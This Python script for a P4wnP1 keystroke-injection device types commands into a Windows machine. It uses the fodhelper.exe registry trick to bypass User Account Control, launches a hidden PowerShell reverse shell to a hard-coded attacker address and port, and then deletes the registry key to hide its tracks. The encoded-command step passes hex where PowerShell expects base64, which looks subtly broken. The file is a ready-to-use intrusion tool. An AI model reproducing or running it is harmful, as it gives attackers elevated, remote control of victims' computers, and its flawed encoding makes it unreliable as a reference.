#!/usr/bin/env python3
import os, sys, time

P4WN_HOME = os.environ.get("P4WN_HOME", "/opt/p4wnp1")
sys.path.insert(0, os.path.join(P4WN_HOME, "tools"))
from hid_type import win_r, type_string

def main():
    lhost = os.getenv("P4WN_LHOST", "192.168.1.133")
    lport = int(os.getenv("P4WN_LPORT", "4444"))
    shell = rf'''$c=New-Object Net.Sockets.TCPClient('{lhost}',{lport});
$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};
while(($i=$s.Read($b,0,$b.Length)) -ne 0){{
$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);
$r=(iex $d 2>&1 | Out-String );
$b2=(New-Object -TypeName System.Text.ASCIIEncoding).GetBytes($r);
$s.Write($b2,0,$b2.Length)
}}'''

    encoded = shell.encode("utf-16le").hex()
    powershell_cmd = f"powershell -EncodedCommand {encoded}"

    print("[*] Using UAC bypass via fodhelper.exe")

    win_r()
    time.sleep(0.5)
    type_string("powershell\n")
    time.sleep(1.0)

    cmd = rf'''
Set-ItemProperty "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "";
Set-ItemProperty "HKCU:\Software\Classes\ms-settings\shell\open\command" -Value "powershell -nop -w hidden -c {powershell_cmd}";
Start-Process "fodhelper.exe"; Start-Sleep -Seconds 3;
Remove-Item "HKCU:\Software\Classes\ms-settings" -Recurse -Force
'''
    cmd = "powershell -nop -w hidden -c \"" + cmd.replace('\n', '').replace('"', '`"') + "\""
    type_string(cmd + "\n")
    print("[+] UAC bypass payload launched.")

if __name__ == "__main__":
    main()
